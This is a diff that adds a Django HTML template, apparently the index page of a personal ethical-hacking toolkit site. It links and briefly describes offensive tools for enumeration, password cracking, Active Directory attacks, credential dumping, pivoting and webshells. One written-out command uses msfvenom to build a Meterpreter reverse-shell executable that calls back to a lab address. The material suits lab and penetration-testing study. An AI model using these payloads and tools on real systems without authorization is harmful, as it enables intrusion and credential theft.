@@ -1,0 +1,810 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tools home</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+
+<body>
+<body>
+<h1><a href="{% url 'priv_collection' %}">Privilege Collection</a></h1>
+<h1><a href="{% url 'windows_cmd' %}">Windows Commands</a></h1>
+<h1><a href="{% url 'cms_revshell' %}">CMS Reverse shell database</a></h1>
+<h1><a href="{% url 'lfi' %}">File Tips</a></h1>
+
+<h1>Container / Lab</h1>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'docker' %}">Docker</a></td>
+      <td>Run applications in isolated, portable environments called containers. Useful for building reproducible labs, packaging exploits/tools, and isolating services during testing.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'lxd' %}">lxd</a></td>
+      <td>System-container manager for running full Linux distributions as lightweight VMs/containers. Use when you need an OS-like container (systemd/init) for networked services, AD labs, or multi-host testing.</td>
+    </tr>
+    <tr>
+      <td>Snap</td>
+      <td>Package &amp; distribution system that bundles apps with dependencies into self-contained “snaps”. Handy for installing consistent tooling across different Linux distros without dependency hell.</td>
+    </tr>
+  </tbody>
+</table>
+
+<h1>Analyzer / File &amp; Archive</h1>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'jd_gui' %}">jd_gui</a></td>
+      <td>Converts compiled Java .class bytecode back into readable .java source. Use when reversing Java apps, analyzing Android .class files, or auditing jar bundles for logic/secret discovery.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'mdb' %}">mdb</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url '7z' %}">7z</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'kpcli' %}">kpcli</a></td>
+      <td></td>
+    </tr>
+  </tbody>
+</table>
+
+<h1>Payloads &amp; Generators</h1>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'msfvenom' %}">msfvenom</a></td>
+      <td>
+        Metasploit payload generator: craft shellcode, executables, scripts, and format payloads for many platforms.
+        Example: <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f exe -o shell.exe</code>.
+        Use alongside listeners (e.g., msfconsole/multi/handler). <strong>Only use on systems you own or are authorized to test.</strong>
+      </td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'multi_handler' %}">msfconsole multi-handler</a></td>
+      <td>
+        Generic listener for Metasploit payloads — accepts reverse shells/sessions from payloads you generated (e.g., with <code>msfvenom</code>) and gives you an interactive Meterpreter/shell session. Start the handler inside <code>msfconsole</code> with the appropriate payload and network settings, then wait for the target to connect back.
+      </td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'gcc' %}">gcc</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'javac' %}">javac</a></td>
+      <td></td>
+    </tr>
+  </tbody>
+</table>
+
+<h1>Cracking tools</h1>
+
+<h2>Hash &amp; password cracking</h2>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'john' %}">john (zip2john)</a></td>
+      <td>
+        CPU-based password cracker (“John the Ripper”). Supports many formats (Unix <code>shadow</code>, NT/NTLM, ZIP/RAR via <code>zip2john/rar2john</code>, etc.) and attack modes (wordlist + <code>--rules</code>, incremental/bruteforce, masks). Typical flow: extract hashes (<code>unshadow</code>/<code>zip2john</code>) → <code>john --wordlist=rockyou.txt</code> → <code>john --show</code>.
+      </td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'hash_identifier' %}">hash_identifier</a></td>
+      <td>Analyze a password hash string and suggest likely hash algorithms (MD5, bcrypt, NTLM, etc.). Use first to narrow cracking strategy and select proper hashcat mode.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'hashcat' %}">hashcat</a></td>
+      <td>High-performance password cracker (CPU/GPU). Supports dictionary, mask, rule, and combinator attacks. Use for offline password recovery and testing credential strength once hash type is known.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'hydra' %}">hydra</a></td>
+      <td></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>Password stores &amp; decryptors</h2>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'gpp_decrypt' %}">gpp-decrypt</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'pwsafe' %}">PWSafe</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'keepassxc-cli' %}">keepassxc-cli</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'firefox_decrypt' %}">firefox_decrypt.py</a></td>
+      <td></td>
+    </tr>
+  </tbody>
+</table>
+
+<h1>Enumeration</h1>
+
+<h2>Network &amp; host enumeration</h2>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'nmap' %}">nmap</a></td>
+      <td>Network scanner for host discovery, port/service detection, OS and version fingerprinting, and running NSE scripts. Foundation for initial target profiling and attack surface mapping.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'nfs' %}">NFS</a></td>
+      <td></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>Web &amp; application enumeration</h2>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'ffuf' %}">ffuf</a></td>
+      <td>Fast web fuzzer for discovering hidden files, directories, parameters and virtual hosts. Uses wordlists, supports recursion, filtering by status/size/words/lines, custom headers/methods, concurrency and JSON output—ideal for automated web enumeration.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'gobuster' %}">gobuster</a></td>
+      <td>Fast directory/file, vhost, and DNS brute-forcer. Uses wordlists to enumerate hidden paths/subdomains; supports extensions, custom headers, threading, and status/length filtering for clean results.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'dirsearch' %}">dirsearch</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'nikto' %}">nikto</a></td>
+      <td>Webserver scanner that finds common misconfigurations, outdated components, and dangerous defaults (e.g., exposed CGI, old server banners). Good quick check for low-hanging web vulnerabilities.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'wpscan' %}">wpscan</a></td>
+      <td>WordPress security scanner: enumerates plugins/themes, checks for known vulnerabilities, and performs weak password checks against WP logins. Use when a site runs WordPress.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'sqlmap' %}">sqlmap</a></td>
+      <td>Automated SQL injection and database takeover tool. Detects injectable parameters, enumerates DBs/tables, dumps data, and can attempt OS command execution via SQLi where possible.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'searchsploit' %}">searchsploit</a></td>
+      <td>Local Exploit-DB lookup: quickly find public PoCs and CVE references for discovered software/versions.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'git' %}">git</a></td>
+      <td>Version control tool; in pentesting context, inspect exposed .git directories or repositories to recover source, credentials, or history. Also used for local code inspection and collaboration.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'cewl' %}">CeWL</a></td>
+      <td>Crawls target websites to extract words and build custom wordlists for password cracking and reconnaissance.</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>User / name / SMB enumeration</h2>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'username_anarchy' %}">username-anarchy</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'enum4linux' %}">enum4linux</a></td>
+      <td></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>Host vuln suggestion (Windows)</h2>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'windows-exploit-suggester' %}">windows-exploit-suggester.py</a></td>
+      <td></td>
+    </tr>
+  </tbody>
+</table>
+
+<h1>For AD</h1>
+
+<h2>AD enumeration &amp; mapping</h2>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'sharphound' %}">SharpHound.ps1</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'net' %}">net</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'bloodhound-python' %}">bloodhound-python</a></td>
+      <td></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>Pivot &amp; Kerberos interaction</h2>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'pivot' %}">Pivot Instruction</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'linux_with_kerberos' %}">Linux Kerberos interaction</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'fishing_instruction' %}">Fishing Instruction</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'ligolo_ng' %}">ligolo-ng</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'virtual_computer_accounts' %}">Virtual Computer Accounts</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'golden_ticket' %}">Golden Ticket</a></td>
+      <td></td>
+    </tr>
+  </tbody>
+</table>
+
+<h1>For Windows</h1>
+
+<h2>Basics</h2>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'command' %}">Commands for windows</a></td>
+      <td>This page introduces useful commands for Windows. </td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>Enumeration &amp; remote execution</h2>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'nxc' %}">nxc</a></td>
+      <td>Quickly enumerate, validate credentials, and execute commands across many hosts over SMB/LDAP/WinRM/MSSQL/SSH/RDP. Ideal for credential spraying, share/user/group discovery, and running modules during AD assessments.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'crackmapexec' %}">crackmapexec</a></td>
+      <td>“Swiss-army knife” for Windows networks: validate creds at scale, enumerate shares/sessions/users, dump credentials, and execute commands over SMB/WMI/WinRM.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'smbclient' %}">smbclient</a></td>
+      <td>Interact with SMB shares from the command line: list shares, browse directories, upload/download files, and test access with specific credentials.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'smbget' %}">smbget</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'smbmap' %}">smbmap</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'impacket_smbserver' %}">impacket-smbserver</a></td>
+      <td>Spin up a quick SMB share from any folder (SMB2 support, optional creds). Perfect for ad-hoc file transfer, staging tools, and Windows↔Linux drops; use <code>net use</code> to map and <code>copy</code> to pull.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'evil_winrm' %}">evil-winrm</a></td>
+      <td>Obtain an interactive remote PowerShell session over WinRM with password/hash/Kerberos auth. Great for post-exploitation: command execution, file upload/download, running scripts.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'impacket_psexec' %}">Impacket-psexec</a></td>
+      <td>
+        Runs a remote command/service on a Windows host over SMB by uploading &amp; executing a temporary service binary (uses credentials or NT hashes).
+      </td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'impacket-mssqlclient' %}">Impacket-MSSQLClient</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'ldapsearch' %}">ldapsearch</a></td>
+      <td></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>Credential dumping &amp; DPAPI</h2>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'impacket_secretsdump' %}">Impacket-secretsdump</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'impacket-dpapi' %}">Impacekt-dpapi</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'procdump' %}">procdump(64).exe</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'mimikatz' %}">mimikatz.exe</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'pypykatz' %}">pypykatz</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'responder' %}">Responder</a></td>
+      <td>A tool that listens on the local network and responds to name-resolution and proxy auto-discovery requests (LLMNR / NBT-NS / mDNS / WPAD), collecting client authentication data (e.g., NTLM hashes).</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'ntlm_theft' %}">ntlm_theft.py</a></td>
+      <td></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>AD / Kerberos / Certificates / GPO</h2>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'certipy' %}">certipy</a></td>
+      <td>Use when an environment has AD CS (Certificate Services). Enumerate certificate templates and misconfigs (ESC1–ESC8), request/abuse certificates for privilege escalation, lateral movement, or persistence.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'certipy_ad' %}">certipy-ad</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'certify_exe' %}">Certify.exe</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'rubeus' %}">Rubeus.exe</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'impacket_changepasswd' %}">impacket-changepasswd</a></td>
+      <td>Change or reset an AD user/machine account password via SAMR/RPC/LDAP/Kerberos. Helpful when you know valid creds and want to set a known password for persistence or when SMB logon is blocked but RPC works.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'impacket_lookupsid' %}">Impacket-lookupsid</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'impacket-getadusers' %}">Impacket-GetADUsers</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'impacket-getuserspns' %}">Impacket-GetUserSPNs</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'impacket-getnpusers' %}">Impacket-GetNPUsers</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'impacket_ntlmrelayx' %}">Impacket-NTLMrelayx</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'impacket_ticketer' %}">Impacket-ticketer</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'targetedKerberoast' %}">targetedKerberoast.py</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'bloodyAD' %}">bloodyAD</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'sharpgpoabuse' %}">SharpGPOAbuse.exe</a></td>
+      <td></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>PrivEsc &amp; service abuse</h2>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'powerup' %}">PowerUp.ps1</a></td>
+      <td>Post-exploitation PowerShell audit script that scans a Windows host for common privilege-escalation issues (weak service permissions, unquoted service paths, AlwaysInstallElevated, insecure scheduled tasks, weak ACLs, stored creds, etc.).</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'potato_family' %}">PotatoFamily</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'powerview' %}">PowerView</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'sc_exe' %}">sc.exe</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'printspoofer' %}">PrintSpoofer.exe</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'RunasCS' %}">RunasCS.exe</a></td>
+      <td></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>GUI / RDP clients</h2>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'remmina' %}">remmina</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'xfreerdp3' %}">xfreerdp3</a></td>
+      <td></td>
+    </tr>
+  </tbody>
+</table>
+
+<h1>Binary &amp; Runtime Analysis</h1>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'ltrace' %}">ltrace</a></td>
+      <td>Trace library calls (e.g. getenv, system, printf) to observe runtime behavior and detect uses of <code>PATH</code>, environment, or dangerous functions.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'ps' %}">ps</a></td>
+      <td>List and inspect processes (<code>ps auxww</code>, trees with <code>--forest</code>, custom columns with <code>-o</code>). Use to find rogue services, check parents/children, view environments (<code>ps e</code>), and sort by CPU/MEM.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'identify' %}">identify</a></td>
+      <td>ImageMagick metadata/chunk inspection. Triage PNG/JPEG for hidden data (tEXt/iTXt, raw profiles), confirm format/bit depth, scriptable with <code>-format</code>.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'steghide' %}">steghide</a></td>
+      <td>
+        Steganography tool to hide/extract data inside media (JPEG/BMP/WAV/AU). Embed:
+        <code class="inline">steghide embed -cf cover.jpg -ef secret.txt -sf out.jpg</code>;
+        extract: <code class="inline">steghide extract -sf out.jpg -xf secret.txt</code>.
+      </td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'exiftool' %}">exiftool</a></td>
+      <td></td>
+    </tr>
+  </tbody>
+</table>
+
+<h1>Remote Access</h1>
+
+<h2>Remote shell &amp; file transfer</h2>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'ssh' %}">SSH</a></td>
+      <td>Quick link to SSH client/jump host utility for remote Linux host access and tunneling.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'scp' %}">scp</a></td>
+      <td>Secure copy over SSH. Download/upload files and directories, use keys/ports/options like <code>-i</code>, <code>-P</code>, <code>-r</code>, <code>-v</code>, and <code>-o</code> (same as <code>ssh</code>).</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'ftp' %}">ftp</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'nc64_exe' %}">nc64.exe</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'nc' %}">nc</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'smdb' %}">smdb</a></td>
+      <td></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>Tunneling / pivoting / protocol helpers</h2>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'snmpwalk' %}">snmpwalk</a></td>
+      <td>Query SNMP agents to enumerate MIB objects (system info, interfaces, routing, installed software).</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'snmp_brute' %}">snmp_brute</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'socat' %}">socat</a></td>
+      <td>Bidirectional data relay between two arbitrary data channels (TCP/UDP/UNIX sockets, files, TTYs, stdio). Useful for port-forwarding, proxying, bridging socket types, debugging services, and temporary tunnels.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'chisel' %}">chisel</a></td>
+      <td>Lightweight TCP/UDP tunneller (single static Go binary) that tunnels arbitrary traffic over HTTP(S). Commonly used for reverse tunnels, port-forwarding and pivoting through restrictive networks or proxies.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'openssl' %}">openssl</a></td>
+      <td>Cryptography &amp; TLS toolkit. Generate/manage keys, create CSRs/self-signed certs, inspect/convert PEM/DER/PFX, and probe TLS endpoints (<code>s_client</code>).</td>
+    </tr>
+  </tbody>
+</table>
+
+<h1>Request Handlers</h1>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'curl' %}">curl</a></td>
+      <td>Command-line client for sending/receiving HTTP(S) (and other protocols). Ideal for fetching endpoints and testing APIs.</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'wireshark' %}">wireshark</a></td>
+      <td></td>
+    </tr>
+  </tbody>
+</table>
+
+<h1>Utilities</h1>
+
+<h2>Text / encoding / data processing</h2>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'string_check' %}">Strings Checker</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'xxd' %}">xxd</a></td>
+      <td>Hex dump &amp; reverse tool. View raw bytes, compare diffs, and convert hex &rarr; binary (<code>xxd -r -p</code>) or files &rarr; hex (<code>xxd</code>).</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'grep' %}">grep</a></td>
+      <td>Search files and streams with regex. Useful for log triage, code review, and hunting secrets (<code>-r</code>, <code>-i</code>, <code>-n</code>, <code>-E</code>, <code>--include/--exclude</code>, <code>-C</code>).</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'iconv' %}">iconv</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'awk' %}">awk</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'base64' %}">Base64</a></td>
+      <td></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2>Filesystem / hash / misc</h2>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'chown' %}">chown</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'md5sum' %}">md5sum</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'clipboard' %}">Clipboard Promlem?</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'docx2txt' %}">docx2txt</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'packet_loss' %}">Manage Packet Loss</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'burpsuite' %}">BurpSuite</a></td>
+      <td></td>
+    </tr>
+  </tbody>
+</table>
+
+<h1>Malicious Codes</h1>
+<table border="1" cellpadding="6" cellspacing="0">
+  <thead>
+    <tr>
+      <th>Language</th>
+      <th>Type</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="{% url 'php_webshell' %}">PHP coes</a></td>
+      <td>Very simple webshell code</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'sqli_codes' %}">SQLi codes</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'postgres' %}">postgres</a></td>
+      <td>Postgres information</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'mysql' %}">mysql</a></td>
+      <td>Create web shell using outfile function</td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'mssql' %}">MSSQL</a></td>
+      <td></td>
+    </tr>
+    <tr>
+      <td><a href="{% url 'java_jdb' %}">java-jdb exploit</a></td>
+      <td></td>
+    </tr>
+  </tbody>
+</table>
+</body>
+
+
+
+
+    
+</body>
+</html>
